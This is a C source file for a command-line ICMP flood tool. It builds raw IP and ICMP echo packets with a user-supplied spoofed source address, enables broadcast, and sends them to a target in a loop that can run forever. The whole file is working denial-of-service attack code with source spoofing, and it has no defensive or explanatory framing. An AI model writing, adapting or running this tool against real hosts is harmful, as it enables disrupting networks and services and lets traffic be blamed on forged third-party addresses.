#include "client.h"

char buf[BUFFER_SIZE];
 
char *usage = "\nUsage: ./icmp_flood <saddr> <daddr> <# packets>\n \
	<saddr> = spoofed source address\n \
	<daddr> = target IP address\n \
	<# packets> = is the number of packets to send, 100 is the default, 0 = infinite\n";
void SetupLayer(struct icmphdr *icmp, struct ip *ip)
{
    // IP Layer
    ip->ip_v = 4;
    ip->ip_hl = sizeof*ip >> 2;
    ip->ip_tos = 0;
    ip->ip_len = htons(sizeof(buf));
    ip->ip_id = htons(4321);
    ip->ip_off = htons(0);
    ip->ip_ttl = 255;
    ip->ip_p = 1;
    ip->ip_sum = 0; /* Let kernel fill in */
 
    // ICMP Layer
    icmp->type = ICMP_ECHO;
    icmp->code = 0;	
    icmp->checksum = htons(~(ICMP_ECHO << 8));	
}


void SetSocketOption(int s)
{
    int on = 1;
 
    // Enable broadcast
    if(setsockopt(s, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) < 0){
        perror("setsockopt() for BROADCAST error");
        exit(1);
    }
 
    // socket options, tell the kernel we provide the IP structure 
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
        perror("setsockopt() for IP_HDRINCL error");
        exit(1);
    }	
}



int main(int argc, char *argv[])
{
   int s,i;
   struct ip *ip = (struct ip*)buf;
   struct icmphdr *icmp = (struct icmphdr*)(ip+1);
   struct hostent *hp, *hp2;
   struct sockaddr_in dst;
   //struct sockaddr_in serv_addr;

   int offset;
   int num = DEF_NUM_PACKETS;

   if(argc <3)
   {
    fprintf(stdout,"%s\n",usage);
    exit(1);
   }
   
 

   if(argc == 4)
   {
    num = atoi(argv[3]); 
   } 
   
   for(i=1;num==0?num==0:i<=num;i++){
    
    memset(buf,0,sizeof(buf));
    
    if((s =socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0)
    {
      perror("socket() error");

      exit(1);
    }
    
    SetSocketOption(s);
    
    
    

    if((hp = gethostbyname(argv[2])) ==NULL )
    {
      if((ip->ip_dst.s_addr = inet_addr(argv[2])) == -1)
         {
           fprintf(stderr , "%s: Can't resolve,unknown host.\n",argv[2]);
           exit(1);
         }
    }else
     memcpy(&ip->ip_dst.s_addr,hp->h_addr_list[0],hp->h_length);
   
    if((hp2 = gethostbyname(argv[1])) == NULL)
    {
      if((ip->ip_src.s_addr = inet_addr(argv[1])) == -1){
                fprintf(stderr, "%s: Can't resolve, unknown host\n", argv[1]);
                exit(1);
            }
    }
    else
     memcpy(&ip->ip_src.s_addr, hp2->h_addr_list[0], hp->h_length);
 
    
    
    SetupLayer(icmp,ip);
    dst.sin_addr= ip->ip_dst;
    dst.sin_family = AF_INET;

   
 /*if(connect(s, (struct sockaddr *)&dst, sizeof(dst))<0)
    {
      printf("\n Error : Connect Failed \n");
      return 1;
    }else
     printf("connect() is OK.\n");*/

   if(sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0){
            fprintf(stderr, "Error during packet send.\n");
            perror("sendto() error");
        }else
            printf("sendto() is OK.\n");
 
        close(s);
        usleep(PACKET_DELAY_USEC);


   }

   return 0;
}
